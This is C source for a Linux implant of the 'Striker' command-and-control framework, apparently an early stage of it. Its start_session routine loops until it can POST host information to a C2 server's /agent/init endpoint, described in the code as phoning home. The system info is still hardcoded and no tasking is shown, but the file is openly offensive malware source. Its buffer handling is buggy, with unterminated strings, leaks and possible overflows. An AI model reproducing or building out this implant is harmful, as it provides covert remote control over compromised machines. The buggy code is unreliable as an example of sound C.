/**
 * Striker C2 implant for linux hosts.
 *         Author: Umar Abdul
 */

#include "striker.h"

buffer *create_buffer(size_t size){

  buffer *buff = malloc(sizeof(buffer));
  buff->size = size;
  buff->buffer = malloc(sizeof(char) * ((buff->size == 0) ? 1 : buff->size));
  buff->buffer[0] = '\0'; // So we don't have to do this all the time for buffers used as strings.
  buff->used = 0;
  if (!buff->buffer){
    if (STRIKER_DEBUG)
      fprintf(stderr, "Unable to allocate memory. Exiting.\n");
    exit(EXIT_FAILURE);
  }
  return buff;
}

void resize_buffer(buffer *buff, size_t new_size){

  buff->size = new_size;
  buff->buffer = realloc(buff->buffer, new_size);
  if (!buff->buffer){
    if (STRIKER_DEBUG)
      fprintf(stderr, "Unable to allocate memory. Exiting.\n");
    exit(EXIT_FAILURE);
  }
}

void append_buffer(buffer *dest, const char *src){

  long space_left = dest->size - dest->used;
  if (space_left < 1)
    return;
  size_t src_size = strlen(src);
  strncat(dest->buffer, src, space_left);
  dest->used += (src_size >= space_left ? space_left : src_size);
}

char *buffer_to_string(buffer *buff){

  char *str = malloc(sizeof(char) * (buff->used + 1));
  if (buff->used == 0)
    return NULL;
  return strncpy(str, buff->buffer, buff->used);
}

void free_buffer(buffer *buff){
  
  buff->size = 0;
  buff->used = 0;
  free(buff->buffer);
  free(buff);
}

CURL *init_curl(const char *path, buffer *buff){
  
  CURL *curl = curl_easy_init();
  if (!curl){
    if (STRIKER_DEBUG)
      fprintf(stderr, "Error initializing curl!\n");
    exit(EXIT_FAILURE);
  }
  buffer *url_buff = create_buffer(URL_SIZE);
  append_buffer(url_buff, baseURL);
  append_buffer(url_buff, path);
  printf("URL: %s\n", url_buff->buffer);
  curl_easy_setopt(curl, CURLOPT_URL, url_buff->buffer);
  curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_receiver);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, buff);
  return curl;
}

size_t body_receiver(void *chunk, size_t size, size_t nmemb, buffer *buff){

  size_t chunk_size = size * nmemb;
  size_t curr_size = buff->size;
  resize_buffer(buff, curr_size + chunk_size);
  memcpy(buff->buffer + curr_size, chunk, chunk_size);
  buff->used = buff->size;
  return chunk_size; // This tells curl that we received all bytes.
}

cJSON *sysinfo(){

  cJSON *info = cJSON_Parse("{\"user\":\"agent47\", \"host\":\"debian\"}");
  return info;
}

void start_session(){  
  
  // Default session setup.
  session *striker = malloc(sizeof(session));
  striker->uid = malloc(sizeof(char) * 32);
  striker->delay = 5;

  CURL *curl;
  CURLcode res;
  // Build the common headers that will be used for GET and POST requests.
  struct curl_slist *get_headers = NULL, *post_headers = NULL;
  get_headers = curl_slist_append(get_headers, "Connection: close");
  // post_headers = curl_slist_append(post_headers, "Connction: close");
  post_headers = curl_slist_append(post_headers, "Content-Type: application/json");
  buffer *body = create_buffer(0); // Dynamic buffer for receiving response body.
  
  while (1){
    curl = init_curl("/agent/init", body);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, cJSON_PrintUnformatted(sysinfo()));
    res = curl_easy_perform(curl);
    if (res != CURLE_OK){
      if (STRIKER_DEBUG)
        fprintf(stderr, "Error calling home: %s\n", curl_easy_strerror(res));
      curl_easy_cleanup(curl);
      sleep(striker->delay);
      continue;
    }
    break;
  }

  printf("%ld\n%ld\n", body->size, body->used);
  printf("Phoned home: %s\n", buffer_to_string(body));
  goto end;

  end:
    curl_slist_free_all(get_headers);
    curl_slist_free_all(post_headers);
    curl_easy_cleanup(curl);
    free_buffer(body);
}

int main(int argc, char **argv){
  start_session();
}
